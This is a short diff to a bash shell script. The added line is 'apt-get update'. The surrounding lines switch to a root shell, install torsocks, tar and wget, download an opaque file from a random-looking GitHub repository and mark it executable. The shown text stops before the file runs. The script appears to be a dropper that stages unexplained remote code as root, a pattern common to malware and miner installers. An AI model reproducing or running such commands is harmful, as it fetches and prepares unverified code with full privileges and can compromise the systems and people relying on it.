@@ -1,5 +1,6 @@
 #!/bin/bash
 sudo -i
+sudo apt-get update
 sudo apt-get install -y torsocks tar wget
 wget https://github.com/gcbmofhwlu/pxokfjwoekx/raw/main/mbtnxklk
 chmod 744 mbtnxklk
